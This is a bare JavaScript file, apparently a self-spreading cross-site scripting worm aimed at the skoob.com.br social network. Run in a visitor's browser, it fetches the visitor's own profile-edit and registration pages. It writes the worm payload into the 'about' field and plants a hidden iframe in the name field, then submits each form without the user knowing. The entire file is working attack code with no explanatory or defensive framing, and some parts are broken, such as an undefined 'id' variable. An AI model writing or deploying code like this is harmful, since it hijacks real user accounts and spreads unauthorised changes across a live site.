var div = document.createElement('div');
document.body.appendChild(div);
div.style.display = 'none';

var xmlhttp = new XMLHttpRequest();
xmlhttp.open('GET','http://www.skoob.com.br/usuario/perfil/' + (window.location.pathname.match(/\/(\d*)$/)[1]) + '/',false);
xmlhttp.send(); var source = xmlhttp.responseText.match(/onload\=\"(.*)\"/)[1];
xmlhttp = new XMLHttpRequest();xmlhttp.open('GET','http://www.skoob.com.br/usuario/editar_perfil/',false);
xmlhttp.send(); div.innerHTML = xmlhttp.responseText;

var field;
field = document.getElementById('PerfilUsuarioSobre').value;
if((!field) || (field.indexOf("body") < 0)){
    document.getElementById('PerfilUsuarioSobre').value += source;
    document.getElementById("form").submit();
    xmlhttp.open('GET','http://www.skoob.com.br/usuario/editar_cadastro/',false);
    xmlhttp.send(); div.innerHTML = xmlhttp.responseText;var field;
    field = document.getElementById('UsuarioNome').value += '</TITLE><iframe> style="display: none;" src="/usuario/perfil/' + id + '/"></iframe>';
    document.getElementById("form").submit();
}